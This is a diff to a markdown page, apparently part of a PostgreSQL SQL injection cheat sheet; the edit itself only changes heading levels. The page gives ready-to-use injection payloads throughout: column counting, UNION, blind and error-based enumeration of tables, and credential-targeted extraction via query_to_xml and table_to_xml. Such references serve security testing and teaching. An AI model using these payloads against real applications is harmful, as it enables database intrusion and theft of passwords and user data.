@@ -7,13 +7,11 @@ tags: ["schema", "tables", "columns", "enumeration"]
 lastUpdated: 2025-12-07
 ---
 
-## Tables and Columns
-
 Discovering table and column information is a critical step in SQL injection attacks. PostgreSQL provides multiple ways to enumerate schema information.
 
-### Determining Number of Columns
+## Determining Number of Columns
 
-#### Using ORDER BY
+### Using ORDER BY
 
 ```sql
 -- Keep incrementing n until you get an error
@@ -23,7 +21,7 @@ ORDER BY 3    -- Success
 ORDER BY 4    -- Error: ORDER BY position 4 is not in select list
 ```
 
-#### Using NULL in UNION
+### Using NULL in UNION
 
 ```sql
 -- Add NULLs until the query succeeds
@@ -32,9 +30,9 @@ ORDER BY 4    -- Error: ORDER BY position 4 is not in select list
 ' UNION SELECT NULL,NULL,NULL--   -- Success (3 columns)
 ```
 
-### Retrieving Tables
+## Retrieving Tables
 
-#### Using information_schema (Recommended)
+### Using information_schema (Recommended)
 
 ```sql
 -- List all tables in current database
@@ -51,7 +49,7 @@ FROM information_schema.tables
 WHERE table_schema = 'public';
 ```
 
-#### Using pg_catalog
+### Using pg_catalog
 
 ```sql
 -- List tables using pg_tables
@@ -64,9 +62,9 @@ WHERE relkind = 'r'
 AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public');
 ```
 
-### Retrieving Columns
+## Retrieving Columns
 
-#### Using information_schema
+### Using information_schema
 
 ```sql
 -- Get columns for a specific table
@@ -87,7 +85,7 @@ WHERE column_name LIKE '%pass%'
    OR column_name LIKE '%secret%';
 ```
 
-#### Using pg_catalog
+### Using pg_catalog
 
 ```sql
 -- Get columns using pg_attribute
@@ -99,7 +97,7 @@ AND a.attnum > 0
 AND NOT a.attisdropped;
 ```
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- UNION-based table enumeration
@@ -118,7 +116,7 @@ GROUP BY table_name--
 ' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='u'--
 ```
 
-### Using LIMIT and OFFSET
+## Using LIMIT and OFFSET
 
 ```sql
 -- Get tables one by one
@@ -131,7 +129,7 @@ WHERE table_schema = 'public'
 LIMIT 1 OFFSET 1;  -- Second table
 ```
 
-### Finding Interesting Tables
+## Finding Interesting Tables
 
 ```sql
 -- Find tables likely to contain credentials
@@ -143,11 +141,11 @@ WHERE table_name LIKE '%user%'
    OR table_name LIKE '%login%';
 ```
 
-### XML Helper Functions for Data Extraction
+## XML Helper Functions for Data Extraction
 
 PostgreSQL provides powerful XML functions that can extract entire tables or databases as XML, useful when you need to exfiltrate large amounts of data:
 
-#### query_to_xml()
+### query_to_xml()
 
 Converts any query result to XML:
 
@@ -162,7 +160,7 @@ SELECT query_to_xml('SELECT username, password FROM users', true, true, '');
 SELECT query_to_xml('SELECT * FROM users WHERE role=''admin''', true, true, '');
 ```
 
-#### table_to_xml()
+### table_to_xml()
 
 Converts a table directly to XML:
 
@@ -174,7 +172,7 @@ SELECT table_to_xml('users', true, true, '');
 SELECT table_to_xml('public.users', true, true, '');
 ```
 
-#### database_to_xml()
+### database_to_xml()
 
 Extracts the entire database schema and data as XML (use with caution - can be very large):
 
@@ -183,7 +181,7 @@ Extracts the entire database schema and data as XML (use with caution - can be v
 SELECT database_to_xml(true, true, '');
 ```
 
-#### database_to_xmlschema()
+### database_to_xmlschema()
 
 Gets the database schema structure without data:
 
@@ -192,7 +190,7 @@ Gets the database schema structure without data:
 SELECT database_to_xmlschema(true, true, '');
 ```
 
-#### XML Extraction Injection Examples
+### XML Extraction Injection Examples
 
 ```sql
 -- UNION-based XML extraction
@@ -205,7 +203,7 @@ SELECT database_to_xmlschema(true, true, '');
 ' AND 1=CAST(query_to_xml('SELECT password FROM users LIMIT 1',true,true,'') AS int)--
 ```
 
-### Notes
+## Notes
 
 - `information_schema` is SQL-standard and portable across databases
 - `pg_catalog` provides more PostgreSQL-specific details
